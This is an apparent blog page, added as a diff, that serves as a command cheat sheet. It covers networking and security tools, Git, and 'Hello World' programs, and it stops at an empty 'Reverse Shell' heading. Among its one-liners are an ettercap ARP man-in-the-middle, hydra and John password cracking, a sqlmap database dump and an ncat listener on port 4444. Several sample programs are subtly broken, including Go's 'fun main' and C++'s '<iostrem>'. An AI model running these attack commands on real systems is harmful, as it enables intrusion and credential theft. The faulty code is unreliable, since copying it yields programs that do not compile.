@@ -1,0 +1,639 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<title>The commands and Hello World Program </title>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	<link rel="stylesheet" href="assets/css/main.css" />
+	<noscript>
+		<link rel="stylesheet" href="assets/css/noscript.css" />
+	</noscript>
+	<link rel="stylesheet" href="assets/css/katex.css">
+	<link rel="stylesheet" href="assets/css/katex.min.css">
+	
+	<!-- The content below will be included at the end of the <head> element. -->
+	<script type="text/javascript">
+		
+	</script>
+</head>
+</head>
+
+<body class="is-preload">
+
+	<!-- Wrapper -->
+	<div id="wrapper">
+
+		<!-- Header -->
+		<header id="header">
+			<a href="index.html" class="logo">HOME</a>
+		</header>
+
+		<!-- Nav -->
+		<nav id="nav">
+			<ul class="icons">
+				<li><a href="https://twitter.com/cyberthirty30" class="icon brands fa-twitter" target="_blank"><span
+							class="label">Twitter</span></a></li>
+				<li><a href="https://www.linkedin.com/in/cyber30/" class="icon brands fa-linkedin" target><span
+							class="label">Instagram</span></a></li>
+				<li><a href="https://github.com/cyberthirty/" class="icon brands fa-github"><span
+							class="label">GitHub</span></a></li>
+			</ul>
+		</nav>
+
+		<!-- Main -->
+		<div id="main">
+
+			<!-- Post -->
+			<section class="post">
+
+				<header class="min">
+					<h1 class="min">THE commands that you need to know </h1>
+				</header>
+
+
+				<div class="crossnote markdown-preview">
+					<div>
+						<h2 id="linux-commands" ebook-toc-level-2="" heading="Linux Commands " class="min">Linux Commands </h2>
+
+						<h3 id="ifconfig" ebook-toc-level-3="" heading="ifconfig ">ifconfig </h3>
+						<ul>
+						<li>
+						<p>Display or configure network interface parameters.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">ifconfig</span>
+<span class="token function">ifconfig</span> <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span> up/down
+						</code></pre></li>
+						</ul>
+						<h3 id="ip" ebook-toc-level-3="" heading="ip ">ip </h3>
+						<ul>
+						<li>
+						<p>A more versatile tool for network configuration.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">ip</span> addr show
+<span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span> up/down
+						</code></pre></li>
+						</ul>
+						<h3 id="route" ebook-toc-level-3="" heading="route ">route </h3>
+						<ul>
+						<li>
+						<p>Display or manipulate the IP routing table.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>route <span class="token parameter variable">-n</span>
+route <span class="token function">add</span> default gw <span class="token operator">&lt;</span>gateway<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="ping" ebook-toc-level-3="" heading="ping ">ping </h3>
+						<ul>
+						<li>
+						<p>Test network connectivity.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">ping</span> <span class="token operator">&lt;</span>hostname/IP<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="traceroute" ebook-toc-level-3="" heading="traceroute ">traceroute </h3>
+						<ul>
+						<li>
+						<p>Trace the route that packets take to reach a destination.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">traceroute</span> <span class="token operator">&lt;</span>hostname/IP<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="netstat" ebook-toc-level-3="" heading="netstat ">netstat </h3>
+						<ul>
+						<li>
+						<p>Display network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">netstat</span> <span class="token parameter variable">-an</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="nmap" ebook-toc-level-3="" heading="nmap ">nmap </h3>
+						<ul>
+						<li>
+						<p>Network exploration tool and security/port scanner.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="tcpdump" ebook-toc-level-3="" heading="tcpdump ">tcpdump </h3>
+						<ul>
+						<li>
+						<p>Capture and analyze packets on a network.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>tcpdump <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="arp-scan" ebook-toc-level-3="" heading="arp-scan ">arp-scan </h3>
+						<ul>
+						<li>
+						<p>Scans for live hosts on a network using ARP.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>arp-scan <span class="token operator">&lt;</span>network_range<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="iwconfig" ebook-toc-level-3="" heading="iwconfig ">iwconfig </h3>
+						<ul>
+						<li>
+						<p>Configure wireless network interfaces.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>iwconfig
+						</code></pre></li>
+						</ul>
+						<h3 id="ss" ebook-toc-level-3="" heading="ss ">ss </h3>
+						<ul>
+						<li>
+						<p>Display socket statistics.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>ss <span class="token parameter variable">-tunapl</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="host" ebook-toc-level-3="" heading="host ">host </h3>
+						<ul>
+						<li>
+						<p>Perform DNS lookups.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">host</span> <span class="token operator">&lt;</span>hostname<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="dig" ebook-toc-level-3="" heading="dig ">dig </h3>
+						<ul>
+						<li>
+						<p>A versatile DNS query tool.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">dig</span> <span class="token operator">&lt;</span>hostname<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="iptables" ebook-toc-level-3="" heading="iptables ">iptables </h3>
+						<ul>
+						<li>
+						<p>Configure IP packet filter rules.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>iptables <span class="token parameter variable">-L</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="wireshark" ebook-toc-level-3="" heading="Wireshark ">Wireshark </h3>
+						<ul>
+						<li>
+						<p>A powerful network protocol analyzer (requires installation).</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>wireshark
+						</code></pre></li>
+						</ul>
+						<h3 id="hping3" ebook-toc-level-3="" heading="hping3 ">hping3 </h3>
+						<ul>
+						<li>
+						<p>A versatile tool for packet crafting and sending.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>hping3 <span class="token parameter variable">-c</span> <span class="token number">3</span> <span class="token parameter variable">-S</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="ettercap" ebook-toc-level-3="" heading="ettercap ">ettercap </h3>
+						<ul>
+						<li>
+						<p>A comprehensive, mature suite for man-in-the-middle attacks.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>ettercap <span class="token parameter variable">-T</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-M</span> arp:remote /<span class="token operator">&lt;</span>gateway<span class="token operator">&gt;</span>// /<span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>//
+						</code></pre></li>
+						</ul>
+						<h3 id="aircrack-ng" ebook-toc-level-3="" heading="aircrack-ng ">aircrack-ng </h3>
+						<ul>
+						<li>
+						<p>A suite of tools for assessing Wi-Fi network security.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>airodump-ng <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="tcpdump-with-filters" ebook-toc-level-3="" heading="tcpdump with filters ">tcpdump with filters </h3>
+						<ul>
+						<li>
+						<p>Capture packets with specific criteria.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>tcpdump <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span> <span class="token function">host</span> <span class="token operator">&lt;</span>target_ip<span class="token operator">&gt;</span> and port <span class="token operator">&lt;</span>target_port<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="nload" ebook-toc-level-3="" heading="nload ">nload </h3>
+						<ul>
+						<li>
+						<p>Display incoming and outgoing traffic separately.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nload <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="snort" ebook-toc-level-3="" heading="Snort ">Snort </h3>
+						<ul>
+						<li>
+						<p>A powerful open-source intrusion prevention system (IPS) and network intrusion detection system (NIDS).</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>snort <span class="token parameter variable">-q</span> <span class="token parameter variable">-A</span> console <span class="token parameter variable">-q</span> <span class="token parameter variable">-c</span> /etc/snort/snort.conf <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>interface<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="burp-suite" ebook-toc-level-3="" heading="Burp Suite ">Burp Suite </h3>
+						<ul>
+						<li>
+						<p>A graphical tool for testing web application security.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">java</span> <span class="token parameter variable">-jar</span> burpsuite_community_<span class="token operator">&lt;</span>version<span class="token operator">&gt;</span>.jar
+						</code></pre></li>
+						</ul>
+						<h3 id="sqlmap" ebook-toc-level-3="" heading="sqlmap ">sqlmap </h3>
+						<ul>
+						<li>
+						<p>An automated SQL injection and database takeover tool.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/index.php?id=1"</span> <span class="token parameter variable">--dbs</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="mitmproxy" ebook-toc-level-3="" heading="mitmproxy ">mitmproxy </h3>
+						<ul>
+						<li>
+						<p>An interactive TLS-capable intercepting proxy.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>mitmproxy
+						</code></pre></li>
+						</ul>
+						<h3 id="john-the-ripper" ebook-toc-level-3="" heading="John the Ripper ">John the Ripper </h3>
+						<ul>
+						<li>
+						<p>A fast password cracker.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>passwords.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>nt <span class="token operator">&lt;</span>hashfile<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="hydra" ebook-toc-level-3="" heading="Hydra ">Hydra </h3>
+						<ul>
+						<li>
+						<p>A fast and flexible password-cracking tool.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>hydra <span class="token parameter variable">-l</span> <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span> <span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>passwords_file<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>protocol<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="aircrack-ng-1" ebook-toc-level-3="" heading="Aircrack-ng ">Aircrack-ng </h3>
+						<ul>
+						<li>
+						<p>A suite of tools for auditing wireless networks.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>aircrack-ng <span class="token parameter variable">-w</span> <span class="token operator">&lt;</span>wordlist<span class="token operator">&gt;</span> <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>BSSID<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>capture_file.cap<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="recon-ng" ebook-toc-level-3="" heading="Recon-ng ">Recon-ng </h3>
+						<ul>
+						<li>
+						<p>A full-featured web reconnaissance framework.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>recon-ng
+						</code></pre></li>
+						</ul>
+						<h3 id="thc-hydra" ebook-toc-level-3="" heading="THC-Hydra ">THC-Hydra </h3>
+						<ul>
+						<li>
+						<p>Another versatile online password cracking tool.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>hydra <span class="token parameter variable">-l</span> <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span> <span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>passwords_file<span class="token operator">&gt;</span> <span class="token parameter variable">-e</span> nsr <span class="token parameter variable">-t</span> <span class="token number">4</span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>protocol<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="metasploit-framework" ebook-toc-level-3="" heading="Metasploit Framework ">Metasploit Framework </h3>
+						<ul>
+						<li>
+						<p>A powerful penetration testing framework.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>msfconsole
+						</code></pre></li>
+						</ul>
+						<h3 id="sniffing-with-scapy" ebook-toc-level-3="" heading="Sniffing with Scapy ">Sniffing with Scapy </h3>
+						<ul>
+						<li>
+						<p>A powerful interactive packet manipulation program.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>scapy
+						</code></pre></li>
+						</ul>
+						<h3 id="nikto" ebook-toc-level-3="" heading="Nikto ">Nikto </h3>
+						<ul>
+						<li>
+						<p>A web server scanner that performs comprehensive tests against web servers for multiple items.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nikto <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="dirb" ebook-toc-level-3="" heading="Dirb ">Dirb </h3>
+						<ul>
+						<li>
+						<p>A web content scanner, often used for finding hidden directories.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>dirb http://<span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="wafw00f" ebook-toc-level-3="" heading="Wafw00f ">Wafw00f </h3>
+						<ul>
+						<li>
+						<p>Identifies and fingerprints Web Application Firewall (WAF) products.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>wafw00f <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h3 id="tcpick" ebook-toc-level-3="" heading="tcpick ">tcpick </h3>
+						<ul>
+						<li>
+						<p>A text-based TCP packet sniffer.</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>tcpick <span class="token parameter variable">-C</span> <span class="token parameter variable">-yP</span> <span class="token parameter variable">-r</span> <span class="token operator">&lt;</span>pcap_file<span class="token operator">&gt;</span>
+						</code></pre></li>
+						</ul>
+						<h2 id="windows-commands" ebook-toc-level-2="" heading="Windows Commands " class="min">Windows Commands </h2>
+						<h3 id="ipconfig" ebook-toc-level-3="" heading="ipconfig ">ipconfig </h3>
+						<ul>
+						<li>
+						<p>Display or configure network interface parameters.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>ipconfig
+						</code></pre></li>
+						</ul>
+						<h3 id="netsh" ebook-toc-level-3="" heading="netsh ">netsh </h3>
+						<ul>
+						<li>
+						<p>Network shell command-line tool.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>netsh interface ipv4 show addresses
+netsh interface ipv6 show addresses
+						</code></pre></li>
+						</ul>
+						<h3 id="netstat-1" ebook-toc-level-3="" heading="netstat ">netstat </h3>
+						<ul>
+						<li>
+						<p>Display network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>netstat -an
+						</code></pre></li>
+						</ul>
+						<h3 id="route-1" ebook-toc-level-3="" heading="route ">route </h3>
+						<ul>
+						<li>
+						<p>Display or manipulate the IP routing table.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>route print
+route add 0.0.0.0 mask 0.0.0.0 &lt;gateway&gt;
+						</code></pre></li>
+						</ul>
+						<h3 id="ping-1" ebook-toc-level-3="" heading="ping ">ping </h3>
+						<ul>
+						<li>
+						<p>Test network connectivity.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>ping &lt;hostname/IP&gt;
+						</code></pre></li>
+						</ul>
+						<h3 id="tracert" ebook-toc-level-3="" heading="tracert ">tracert </h3>
+						<ul>
+						<li>
+						<p>Trace the route that packets take to reach a destination.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>tracert &lt;hostname/IP&gt;
+						</code></pre></li>
+						</ul>
+						<h3 id="nslookup" ebook-toc-level-3="" heading="nslookup ">nslookup </h3>
+						<ul>
+						<li>
+						<p>Query DNS for information.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>nslookup &lt;hostname&gt;
+						</code></pre></li>
+						</ul>
+						<h3 id="arp" ebook-toc-level-3="" heading="arp ">arp </h3>
+						<ul>
+						<li>
+						<p>Display and modify the ARP (Address Resolution Protocol) cache.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>arp -a
+						</code></pre></li>
+						</ul>
+						<h3 id="nmap-1" ebook-toc-level-3="" heading="nmap ">nmap </h3>
+						<ul>
+						<li>
+						<p>Network exploration tool and security/port scanner (can be installed on Windows).</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>nmap &lt;target&gt;
+						</code></pre></li>
+						</ul>
+						<h3 id="ncat" ebook-toc-level-3="" heading="ncat ">ncat </h3>
+						<ul>
+						<li>
+						<p>A feature-rich networking utility that reads and writes data across networks using the TCP/IP protocol.</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>ncat -lvp 4444
+						</code></pre></li>
+						</ul>
+						<h3 id="curl" ebook-toc-level-3="" heading="curl ">curl </h3>
+						<ul>
+						<li>
+						<p>A powerful tool that crawls, download and analyse website</p>
+						<pre data-role="codeBlock" data-info="cmd" class="language-cmd cmd"><code>curl &lt;hostname/ip&gt;
+						</code></pre></li>
+						</ul>
+						<h2 id="git-command" ebook-toc-level-2="" heading="Git Command " class="min">Git Commands </h2>
+						<ul>
+						<li>
+						<p>The command displays git versions</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> <span class="token parameter variable">--version</span>
+						</code></pre></li>
+
+						<li>
+						<p>Initailizing a repository</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> init
+						</code></pre></li>
+
+						<li>
+						<p>Staging files</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> <span class="token function">add</span> file.java <span class="token comment">#single file</span>
+<span class="token function">git</span> <span class="token function">add</span> file.java file.py <span class="token comment">#multi files</span>
+<span class="token function">git</span> <span class="token function">add</span> *.java <span class="token comment">#using pattern or extension</span>
+<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>
+						</code></pre></li>
+						<li>
+						<p>Committing staged files</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"[message]"</span>
+<span class="token function">git</span> commit <span class="token comment">#open default editor</span>
+						</code></pre></li>
+						<li>
+						<p>Removing the staged files</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> <span class="token function">rm</span> file.java
+						<span class="token function">git</span> <span class="token function">rm</span> <span class="token parameter variable">-r</span> folder <span class="token comment">#folder with subfolders and files</span>
+						</code></pre></li>
+						<li>
+						<p>Moving and Renaming a file</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> <span class="token function">mv</span> file.go userinput.go
+						</code></pre></li>
+						<li>
+						<p>Viewing the status</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> status <span class="token comment"># full</span>
+<span class="token function">git</span> status <span class="token parameter variable">-s</span> <span class="token comment"># short</span>
+						</code></pre></li>
+
+						<li>
+						<p>configuring - get and set repository or global options</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token operator">&lt;</span>full name<span class="token operator">&gt;</span>
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token operator">&lt;</span>email<span class="token operator">&gt;</span>
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> core.editor <span class="token string">"code/subl wait"</span>
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">-e</span>
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token assign-left variable">core.eol</span><span class="token operator">=</span>crlf
+<span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token assign-left variable">core.eol</span><span class="token operator">=</span>lf
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> core.autocrlf <span class="token boolean">true</span> <span class="token comment">#for windows users</span>
+						</code></pre><pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">git</span> config <span class="token parameter variable">--global</span> core.autocrlf input <span class="token comment">#for mac &amp; linux users</span>
+						</code></pre></li>
+						</ul>
+						<h1 id="scripting-and-programming" ebook-toc-level-1="" heading="Scripting and Programming " align="center">Scripting and Programming </h1>
+						<h2 id="hello-world-program" ebook-toc-level-2="" heading="Hello World Program ">Hello World Program </h2>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in Python -->
+						<h3 id="python" ebook-toc-level-3="" heading="Python ">Python </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Python</p>
+						<pre data-role="codeBlock" data-info="python" class="language-python python"><code><span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>
+						</code></pre></li>
+
+						
+	<!-- Structure and write a "Hello, World!" program in Powershell -->
+						</ul>
+						<h3 id="powershell" ebook-toc-level-3="" heading="Powershell ">Powershell </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Powershell</p>
+						<pre data-role="codeBlock" data-info="powershell" class="language-powershell powershell"><code><span class="token function">Write-Host</span> <span class="token string">"Hello World!"</span>
+						</code></pre></li>
+						</ul>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in Golang -->
+						<h3 id="golang" ebook-toc-level-3="" heading="GoLang ">GoLang </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Go</p>
+						<pre data-role="codeBlock" data-info="go" class="language-go go"><code><span class="token keyword keyword-package">package</span> main
+
+<span class="token keyword keyword-import">import</span> <span class="token string">"fmt"</span>
+
+fun <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	fmt<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+						</code></pre></li>
+						</ul>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in C++ -->
+						<h3 id="c" ebook-toc-level-3="" heading="C++ ">C++ </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in C++</p>
+						<pre data-role="codeBlock" data-info="cpp" class="language-cpp cpp"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostrem&gt;</span></span>
+
+<span class="token keyword keyword-using">using</span> <span class="token keyword keyword-namespace">namespace</span> std<span class="token punctuation">;</span>
+<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	cout<span class="token operator">&lt;&lt;</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">;</span>
+	<span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+						</code></pre></li>
+						</ul>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in Java -->
+						<h3 id="java" ebook-toc-level-3="" heading="Java ">Java </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Java</p>
+						<pre data-role="codeBlock" data-info="java" class="language-java java"><code><span class="token keyword keyword-public">public</span> <span class="token keyword keyword-class">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">{</span>
+	<span class="token keyword keyword-public">public</span> <span class="token keyword keyword-static">static</span> <span class="token keyword keyword-void">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+						</code></pre></li>
+						</ul>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in Bash -->
+						<h3 id="bash" ebook-toc-level-3="" heading="Bash ">Bash </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Bash</p>
+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token builtin class-name">echo</span> <span class="token string">"Hello world!"</span>
+						</code></pre></li>
+						</ul>
+
+
+						
+	<!-- Structure and write a "Hello, World!" program in Assembly -->
+						<h3 id="assembly" ebook-toc-level-3="" heading="Assembly ">Assembly </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Assembly</p>
+						<pre data-role="codeBlock" data-info="nasm" class="language-nasm nasm"><code><span class="token keyword keyword-section .data">section .data</span>
+	msg db <span class="token string">"Hello World!"</span>, <span class="token number">0x4</span>
+	len equ <span class="token operator">$</span><span class="token operator">-</span>msg
+
+<span class="token keyword keyword-global _start">global _start</span>
+
+<span class="token keyword keyword-section .text">section .text</span>
+<span class="token label function">_start:</span>
+	mov <span class="token register variable">eax</span>, <span class="token number">4</span>      <span class="token comment">; </span>
+	mov <span class="token register variable">ebx</span>, <span class="token number">1</span>      <span class="token comment">;</span>
+	mov <span class="token register variable">ecx</span>, msg    <span class="token comment">;</span>
+	mov <span class="token register variable">edx</span>, len    <span class="token comment">; </span>
+	int <span class="token number">0x80</span>        <span class="token comment">;</span>
+
+	<span class="token comment">; exit </span>
+	mov <span class="token register variable">eax</span>,<span class="token number">1</span>
+	int <span class="token number">0x80</span>
+						</code></pre></li>
+						</ul>
+
+
+	<!-- Structure and write a "Hello, World!" program in Ruby -->
+						<h3 id="ruby" ebook-toc-level-3="" heading="Ruby ">Ruby </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Ruby</p>
+						<pre data-role="codeBlock" data-info="ruby" class="language-ruby ruby"><code>puts <span class="token string-literal"><span class="token string">"Hello, World!"</span></span>
+						</code></pre></li>
+						</ul>
+
+
+	<!-- Structure and write a "Hello, World!" program in Rust -->
+						<h3 id="rust" ebook-toc-level-3="" heading="Rust ">Rust </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in Rust</p>
+						<pre data-role="codeBlock" data-info="rust" class="language-rust rust"><code><span class="token keyword keyword-fn">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hello, World"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+						</code></pre></li>
+						</ul>
+
+
+	<!-- Structure and write a "Hello, World!" program in C -->
+						<h3 id="c-1" ebook-toc-level-3="" heading="C ">C </h3>
+						<ul>
+						<li>
+						<p>Structure and write a "Hello, World!" program in C</p>
+						<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+
+<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+						</code></pre>
+							</li>
+						</ul>
+
+
+						<br />
+						<h2 id="reverse-shell" ebook-toc-level-2="" heading="REVERSE SHELL " class="min">REVERSE SHELL </h2>
+						<h3 id="bash-1" ebook-toc-level-3="" heading="Bash ">Bash </h3>
